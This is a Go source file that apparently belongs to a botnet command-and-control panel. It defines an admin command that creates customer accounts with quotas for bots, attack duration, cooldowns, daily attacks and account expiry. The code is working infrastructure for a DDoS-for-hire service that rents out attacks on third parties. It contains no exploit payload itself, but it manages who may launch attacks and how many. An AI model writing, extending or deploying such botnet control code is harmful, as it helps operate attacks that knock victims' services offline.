package commands

import (
	"cnc/internal/database"
	"cnc/internal/master/command"
	"cnc/internal/master/sessions"
	"strconv"

	"github.com/dustin/go-humanize"
)

var commandUsersAdd = &command.Command{
	Aliases:     []string{"add", "create", "insert"},
	Description: "Insert a user into the database.",
	Arguments: []*command.Argument{
		command.NewArgument("username", nil, command.ArgumentString, true),
		command.NewArgument("password", "changeme", command.ArgumentString, false),
	},
	Executor: func(session *sessions.Session, ctx *command.Context) error {
		username, err := ctx.String("username")
		if err != nil {
			return err
		}

		password, err := ctx.String("password")
		if err != nil {
			return err
		}

		if database.User.Exists(username) {
			return session.Notification("User already exists.")
		}

		_ = session.Notification("Creating user account for %s. You can press enter to skip values.", strconv.Quote(username))

		maxBots, err := session.Integer("Max. bots (all)> ", -1)
		if err != nil {
			return err
		}

		maxDuration, err := session.Integer("Max. Duration (60)> ", 60)
		if err != nil {
			return err
		}

		apiDuration, err := session.Integer("Max. API Duration (600)> ", 600)
		if err != nil {
			return err
		}

		cooldown, err := session.Integer("Cooldown (60)> ", 60)
		if err != nil {
			return err
		}

		apiCooldown, err := session.Integer("API Cooldown (60)> ", 60)
		if err != nil {
			return err
		}

		dailyAttacks, err := session.Integer("Daily attacks (50)> ", 50)
		if err != nil {
			return err
		}

		expiry, err := session.Time("Expiry (1d)> ", "1d")
		if err != nil {
			return err
		}

		// Checks if we REALLY want to insert the user into the database.
		confirmed, err := session.Boolean("Continue (\u001B[92my\u001B[0m/\u001B[91mn\u001B[0m)> ", false)
		if err != nil || !confirmed {
			if err == nil {
				return session.Println("\x1b[91mOperation cancelled due to user input.")
			}

			return err
		}

		// Insert user into the database now yay
		if err := database.User.Insert(&database.UserProfile{
			Name:         username,
			Password:     password,
			Cooldown:     cooldown,
			Duration:     maxDuration,
			Clients:      maxBots,
			DailyAttacks: dailyAttacks,
			Expiry:       expiry,
			ApiCooldown:  apiCooldown,
			ApiDuration:  apiDuration,
			Roles:        []string{},
			CreatedBy:    session.Name,
		}); err != nil {
			return err
		}

		return session.Notification("Added \"%s\" as user. The account will expire in %s.", username, humanize.Time(expiry))
	},
}
